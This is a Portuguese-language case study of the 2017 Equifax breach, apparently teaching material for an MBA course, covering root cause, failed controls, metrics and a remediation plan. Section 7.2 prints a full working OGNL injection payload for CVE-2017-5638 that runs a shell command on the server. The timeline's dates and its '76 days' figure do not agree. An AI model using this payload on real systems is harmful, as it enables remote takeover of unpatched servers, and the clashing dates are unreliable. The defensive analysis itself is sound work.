# Relatório de Avaliação de Riscos
## Caso Equifax 2017 - Análise e Lições Aprendidas

**Classificação:** Confidencial
**Data:** Janeiro 2025
**Versão:** 1.0

---

# PARTE I: RESUMO EXECUTIVO
## Para: Conselho de Administração e C-Level

---

## 1. Síntese do Incidente

Em maio de 2017, a Equifax, uma das três maiores agências de crédito dos Estados Unidos, sofreu uma violação massiva de dados que resultou na exposição de informações pessoais de **147,9 milhões de consumidores** — aproximadamente 45% da população adulta americana.

### Números-Chave

| Métrica | Valor |
|---------|-------|
| **Registros Comprometidos** | 147,9 milhões (EUA) + 15,2 milhões (UK) |
| **Custo Total** | US$ 1,38 bilhão |
| **Multa FTC** | US$ 700 milhões |
| **Queda nas Ações** | 30% imediato |
| **Duração do Ataque** | 76 dias sem detecção |

---

## 2. Causa Raiz (Visão Executiva)

O incidente ocorreu devido a uma **falha crítica na gestão de vulnerabilidades**: um patch de segurança disponível por **dois meses** não foi aplicado a um sistema voltado para a internet.

```
┌─────────────────────────────────────────────────────────────────┐
│                    LINHA DO TEMPO CRÍTICA                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  7 Mar 2017    Patch disponibilizado pela Apache                │
│       │                                                          │
│       │  ← 2 dias                                                │
│       ▼                                                          │
│  9 Mar 2017    Equifax instruída internamente a aplicar patch   │
│       │                                                          │
│       │  ← 1 dia (PATCH NÃO APLICADO)                           │
│       ▼                                                          │
│  10 Mar 2017   ATACANTES GANHAM ACESSO                          │
│       │                                                          │
│       │  ← 76 DIAS SEM DETECÇÃO                                 │
│       ▼                                                          │
│  29 Jul 2017   Violação descoberta                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3. Impacto nos Negócios

### 3.1 Impacto Financeiro Direto

| Categoria | Valor (USD) |
|-----------|-------------|
| Acordo com FTC e estados | $700 milhões |
| Custos de resposta ao incidente | $200+ milhões |
| Melhorias de segurança obrigatórias | $300+ milhões |
| Litígios e honorários legais | $100+ milhões |
| **Total Estimado** | **$1,38 bilhão** |

### 3.2 Impacto Reputacional

- **Perda de confiança**: Consumidores questionaram a capacidade da empresa de proteger dados
- **Cobertura mediática negativa**: Semanas de manchetes internacionais
- **Escrutínio regulatório**: Audiências no Congresso americano
- **Impacto em liderança**: CEO, CIO e CISO deixaram a empresa

### 3.3 Impacto Regulatório

- Novo padrão de expectativas de segurança para bureaus de crédito
- Precedente para multas significativas em casos de negligência
- Requisitos mais rigorosos de notificação de violações

---

## 4. Fatores Críticos de Falha

| Fator | Descrição | Consequência |
|-------|-----------|--------------|
| **Governança de TI** | Falta de visibilidade sobre ativos críticos | Sistema vulnerável não identificado |
| **Gestão de Patches** | Processo ineficaz de aplicação de patches | Vulnerabilidade crítica não corrigida |
| **Detecção** | Certificado SSL expirado por 9 meses | Exfiltração não detectada |
| **Segmentação** | Rede não segmentada adequadamente | Movimentação lateral dos atacantes |

---

## 5. Recomendações para o Conselho

### 5.1 Ações Imediatas (0-30 dias)

1. **Auditoria de Vulnerabilidades Críticas**
   - Verificar se existem vulnerabilidades com CVSS ≥ 9.0 não corrigidas
   - Prioridade: sistemas voltados para internet

2. **Validar Processos de Patching**
   - Confirmar SLAs de patches críticos (recomendado: < 48h)
   - Verificar mecanismos de validação de aplicação

3. **Revisão de Certificados**
   - Inventário de todos os certificados SSL/TLS
   - Implementar monitoramento de expiração

### 5.2 Ações de Médio Prazo (30-90 dias)

1. **Segmentação de Rede**
   - Isolar sistemas críticos
   - Implementar modelo Zero Trust

2. **Melhoria na Detecção**
   - Implementar EDR/NDR em todos os sistemas críticos
   - Monitoramento de exfiltração de dados (DLP)

### 5.3 Governança Contínua

1. **Métricas de Segurança para o Board**
   - Tempo médio para aplicar patches críticos
   - Número de vulnerabilidades críticas abertas
   - Cobertura de monitoramento de segurança

2. **Investimento em Segurança**
   - Revisar orçamento de segurança em relação aos riscos
   - Considerar seguro cibernético adequado

---

## 6. Conclusão Executiva

O caso Equifax demonstra que **falhas básicas de higiene de segurança** podem resultar em consequências catastróficas. A vulnerabilidade explorada era conhecida e tinha correção disponível — o incidente foi resultado de falha de processo, não de sofisticação do ataque.

**Mensagem-chave**: Investimentos em ferramentas avançadas são inúteis se processos básicos como gestão de patches não funcionarem corretamente.

---

# PARTE II: RELATÓRIO TÉCNICO
## Para: CISO e Equipe de Segurança da Informação

---

## 7. Análise Técnica Detalhada

### 7.1 Vulnerabilidade Explorada

| Atributo | Valor |
|----------|-------|
| **CVE** | CVE-2017-5638 |
| **Componente** | Apache Struts 2 (Jakarta Multipart Parser) |
| **Tipo** | Remote Code Execution (RCE) |
| **CVSS v3** | **10.0 (Crítico)** |
| **Vetor** | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |

### 7.2 Mecanismo de Exploração

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    ANATOMIA DO ATAQUE CVE-2017-5638                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  1. REQUISIÇÃO MALICIOSA                                                         │
│     ┌──────────────────────────────────────────────────────────────────────┐    │
│     │  POST /dispute HTTP/1.1                                               │    │
│     │  Host: disputes.equifax.com                                           │    │
│     │  Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext   │    │
│     │    @DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):     │    │
│     │    ((#container=#context['com.opensymphony.xwork2.ActionContext      │    │
│     │    .container']).(#ognlUtil=#container.getInstance(@com.opensymphony │    │
│     │    .xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames  │    │
│     │    ().clear()).(#ognlUtil.getExcludedClasses().clear()).             │    │
│     │    (#context.setMemberAccess(#dm)))).(#cmd='whoami').                │    │
│     │    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()   │    │
│     │    .contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh',   │    │
│     │    '-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).            │    │
│     │    (#p.redirectErrorStream(true)).(#process=#p.start()).             │    │
│     │    (#ros=(@org.apache.struts2.ServletActionContext@getResponse()     │    │
│     │    .getOutputStream())).(@org.apache.commons.io.IOUtils@copy        │    │
│     │    (#process.getInputStream(),#ros)).(#ros.flush())}                 │    │
│     └──────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  2. PROCESSAMENTO PELO STRUTS                                                    │
│     • Jakarta Multipart Parser processa Content-Type                            │
│     • Expressão OGNL é avaliada em contexto privilegiado                        │
│     • Comando arbitrário é executado no servidor                                │
│                                                                                  │
│  3. RESULTADO                                                                    │
│     • Execução remota de código como usuário da aplicação                       │
│     • Acesso inicial ao ambiente interno                                        │
│                                                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 7.3 Kill Chain do Ataque (MITRE ATT&CK)

| Fase | Técnica | ID ATT&CK | Descrição |
|------|---------|-----------|-----------|
| Initial Access | Exploit Public-Facing Application | T1190 | Exploração CVE-2017-5638 |
| Execution | Command and Scripting Interpreter | T1059 | Comandos via OGNL injection |
| Persistence | Valid Accounts | T1078 | Credenciais encontradas em texto plano |
| Credential Access | Unsecured Credentials | T1552 | Senhas em arquivos de configuração |
| Discovery | Network Service Discovery | T1046 | Reconhecimento de rede interna |
| Lateral Movement | Remote Services | T1021 | Movimentação com credenciais válidas |
| Collection | Data from Local System | T1005 | Coleta de dados de consumidores |
| Exfiltration | Exfiltration Over Web Service | T1567 | Extração de ~100GB de dados |

### 7.4 Indicadores de Comprometimento (IOCs)

```yaml
# IOCs relacionados ao ataque Equifax
network:
  - type: http_header
    indicator: "Content-Type: %{.*ognl.*}"
    description: "Tentativa de exploração OGNL injection"

file_hashes:
  - type: sha256
    indicator: "Hashes de webshells identificados pós-incidente"
    note: "Não divulgados publicamente"

behavioral:
  - type: outbound_data
    indicator: "Transferência de grandes volumes para IPs externos"
    threshold: ">1GB em período curto"

  - type: db_query
    indicator: "Queries em massa em tabelas de PII"
    threshold: ">100K registros/hora"
```

---

## 8. Análise de Vulnerabilidades Organizacionais

### 8.1 Mapeamento de Falhas de Controle

| Controle NIST CSF | Status Equifax | Gap Identificado | Impacto |
|-------------------|----------------|------------------|---------|
| ID.AM-1 (Inventário de Ativos) | Parcial | Sistemas com Struts não totalmente mapeados | Crítico |
| ID.RA-1 (Vulnerabilidades) | Falha | Scan não identificou Struts vulnerável | Crítico |
| PR.IP-12 (Patch Management) | Falha | Patch não aplicado em 76+ dias | Crítico |
| PR.DS-5 (Proteção contra vazamento) | Falha | DLP não detectou exfiltração | Alto |
| DE.CM-1 (Monitoramento de rede) | Falha | Certificado SSL expirado | Alto |
| DE.CM-4 (Código malicioso) | Parcial | Webshell não detectado | Alto |
| RS.AN-1 (Investigação) | N/A | Só iniciou após descoberta tardia | - |

### 8.2 Análise de Causa Raiz (5 Porquês)

```
POR QUE 1: Por que os dados foram exfiltrados?
    → Atacantes obtiveram acesso à rede e aos bancos de dados

POR QUE 2: Por que atacantes obtiveram acesso?
    → Vulnerabilidade CVE-2017-5638 foi explorada

POR QUE 3: Por que a vulnerabilidade estava presente?
    → Patch disponível não foi aplicado

POR QUE 4: Por que o patch não foi aplicado?
    → Comunicação interna falhou; responsável não recebeu/executou a instrução

POR QUE 5: Por que a comunicação falhou?
    → Processo de gestão de vulnerabilidades não tinha:
       - Rastreamento de aplicação de patches
       - Validação de conclusão
       - Escalação automática
       - Inventário preciso de sistemas afetados

CAUSA RAIZ: Falha sistêmica no processo de gestão de vulnerabilidades
            combinada com falta de visibilidade de ativos
```

---

## 9. Métricas e Indicadores

### 9.1 Métricas do Incidente

| Métrica | Valor Equifax | Benchmark de Mercado | Gap |
|---------|---------------|---------------------|-----|
| **MTTD** (Tempo para Detectar) | 76 dias | < 24 horas | -75 dias |
| **MTTR** (Tempo para Responder) | N/A (não aplicado) | < 48 horas | Falha total |
| **Tempo para Patch Crítico** | Não aplicado | < 72 horas | Falha total |
| **Taxa de Cobertura de Ativos** | Desconhecido | 100% | - |
| **Cobertura de Monitoramento** | Parcial | 100% críticos | Gap significativo |

### 9.2 Custo por Registro Comprometido

```
Custo Total: $1,38 bilhão
Registros: 147,9 milhões

Custo por Registro: $9,33

Comparação com Benchmarks:
- Média IBM 2017: $141/registro (com detecção e resposta)
- Equifax: $9,33/registro (sem incluir danos aos consumidores)

Nota: O custo real por consumidor afetado é muito maior quando
consideramos impactos de longo prazo como roubo de identidade.
```

### 9.3 KPIs Recomendados Pós-Incidente

| KPI | Definição | Meta | Frequência |
|-----|-----------|------|------------|
| Vulnerabilidades Críticas Abertas | Contagem de vulns CVSS ≥ 9.0 não remediadas | 0 | Diário |
| Tempo Médio para Patch Crítico | Média de dias para aplicar patches CVSS ≥ 9.0 | < 48h | Mensal |
| Cobertura de Inventário | % de ativos no inventário vs. descobertos | 100% | Semanal |
| Certificados Próximos de Expirar | Contagem de certs expirando em 30 dias | 0 | Diário |
| Taxa de Falso Negativo de Scan | % de vulns não detectadas por scanners | < 5% | Mensal |
| Cobertura de EDR | % de endpoints com EDR ativo | 100% | Semanal |

---

## 10. Análise de Controles de Segurança

### 10.1 Controles que Falharam

| Controle | Implementação Esperada | Realidade Equifax | Recomendação |
|----------|------------------------|-------------------|--------------|
| **Vulnerability Management** | Scan regular, priorização, SLA de remediação | Scanner não detectou Struts; sem validação de patches | Implementar AST, DAST, validação pós-patch |
| **Asset Management** | Inventário completo com versões de software | Inventário incompleto | CMDB atualizado, descoberta automática |
| **Network Segmentation** | Zonas de segurança, microsegmentação | Rede plana permitiu movimentação lateral | Zero Trust, microsegmentação |
| **Data Loss Prevention** | Monitoramento de exfiltração | Não detectou 100GB saindo | DLP com ML, monitoramento de egress |
| **Certificate Management** | Inventário, alertas de expiração, renovação automática | Certificado expirado por 9 meses | Automação de lifecycle de certificados |
| **Security Monitoring** | SIEM, correlação, alertas em tempo real | Logs não correlacionados | SIEM com UEBA, playbooks automatizados |

### 10.2 Controles Recomendados

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    ARQUITETURA DE CONTROLES RECOMENDADA                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  CAMADA 1: PREVENÇÃO                                                             │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ • WAF com regras para OGNL injection                                    │    │
│  │ • Patch management automatizado com SLA de 48h para críticos           │    │
│  │ • Hardening de aplicações (desabilitar parsers desnecessários)         │    │
│  │ • Segmentação de rede (sistemas de PII isolados)                       │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  CAMADA 2: DETECÇÃO                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ • SIEM com correlação e UEBA                                            │    │
│  │ • EDR em todos os servidores                                            │    │
│  │ • NDR para detecção de exfiltração                                      │    │
│  │ • DLP com inspeção SSL                                                  │    │
│  │ • Monitoramento de certificados                                         │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  CAMADA 3: RESPOSTA                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ • SOAR para automação de resposta                                       │    │
│  │ • Playbooks para contenção de webshells                                 │    │
│  │ • Capacidade de isolamento de rede em minutos                           │    │
│  │ • Forense digital preparada                                             │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  CAMADA 4: GOVERNANÇA                                                            │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ • Inventário de ativos atualizado automaticamente                       │    │
│  │ • Métricas de segurança reportadas ao Board                             │    │
│  │ • Exercícios de tabletop trimestrais                                    │    │
│  │ • Red team anual                                                        │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 11. Plano de Remediação Técnica

### 11.1 Prioridade Imediata (0-7 dias)

| Ação | Responsável | Validação |
|------|-------------|-----------|
| Scan de todas as instâncias Apache Struts | Vulnerability Management | Relatório de scan |
| Aplicar patches para CVE-2017-5638 | Sysadmin/DevOps | Validação pós-patch |
| Verificar IoCs em logs históricos | SOC/IR | Relatório de análise |
| Auditar certificados SSL/TLS | Security Ops | Inventário atualizado |
| Validar configuração de DLP | Security Ops | Teste de exfiltração |

### 11.2 Curto Prazo (7-30 dias)

| Ação | Responsável | Entregável |
|------|-------------|------------|
| Implementar regras WAF para OGNL | Security Engineering | Regras em produção |
| Deploy de EDR em servidores críticos | Security Ops | 100% cobertura |
| Configurar alertas de certificados | Security Ops | Dashboard + alertas |
| Segmentar rede de sistemas de PII | Network Security | Diagrama + implementação |
| Criar playbook de resposta para RCE | IR Team | Playbook documentado |

### 11.3 Médio Prazo (30-90 dias)

| Ação | Responsável | Entregável |
|------|-------------|------------|
| Implementar SIEM com UEBA | Security Ops | SIEM operacional |
| Automatizar patch management | IT Ops | Pipeline CI/CD com patches |
| Implementar NDR | Security Engineering | NDR em produção |
| Realizar pen test focado em aplicações web | Red Team | Relatório de pen test |
| Atualizar inventário de ativos | IT/Security | CMDB completo |

### 11.4 Longo Prazo (90-365 dias)

| Ação | Responsável | Entregável |
|------|-------------|------------|
| Arquitetura Zero Trust | Security Architecture | Roadmap + implementação |
| Programa de Bug Bounty | Security | Programa lançado |
| Certificação ISO 27001 | Compliance | Certificação obtida |
| Exercícios de Red Team regulares | Red Team | Relatórios trimestrais |
| Maturidade NIST CSF Tier 4 | CISO | Assessment documentado |

---

## 12. Conclusões Técnicas

### 12.1 Principais Lições

1. **Gestão de Vulnerabilidades é Fundamental**
   - CVE-2017-5638 tinha CVSS 10.0 e patch disponível
   - Processo de patching falhou em múltiplos pontos
   - Validação de aplicação de patches é tão importante quanto o scan

2. **Visibilidade é Pré-requisito**
   - Não é possível proteger o que não se conhece
   - Inventário de ativos deve incluir versões de software
   - Certificados expirados são sintoma de falta de visibilidade

3. **Defense in Depth é Essencial**
   - Uma única camada de defesa não é suficiente
   - Segmentação teria limitado o impacto
   - Detecção de exfiltração teria reduzido a escala

4. **Tempo é Crítico**
   - 76 dias de permanência é inaceitável
   - Detecção em horas/dias vs. meses muda o resultado
   - Automação de resposta reduz impacto

### 12.2 Checklist de Validação

```
□ Todas as instâncias de Apache Struts identificadas e patcheadas?
□ Processo de gestão de vulnerabilidades inclui validação de remediação?
□ Inventário de ativos está completo e atualizado?
□ Todos os certificados SSL/TLS estão válidos e monitorados?
□ DLP está configurado e testado para detectar exfiltração de PII?
□ Segmentação de rede isola sistemas com dados sensíveis?
□ SIEM está correlacionando eventos de todas as fontes críticas?
□ Playbooks de resposta a incidentes estão documentados e testados?
□ Métricas de segurança estão sendo reportadas à liderança?
□ Exercícios de tabletop/red team estão programados?
```

---

## 13. Referências Técnicas

- [NIST NVD - CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [Apache Struts Security Bulletin S2-045](https://struts.apache.org/docs/s2-045.html)
- [US Senate Report on Equifax](https://www.hsgac.senate.gov/subcommittees/investigations/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Documento preparado para fins educacionais - MBA Cibersegurança & IA**
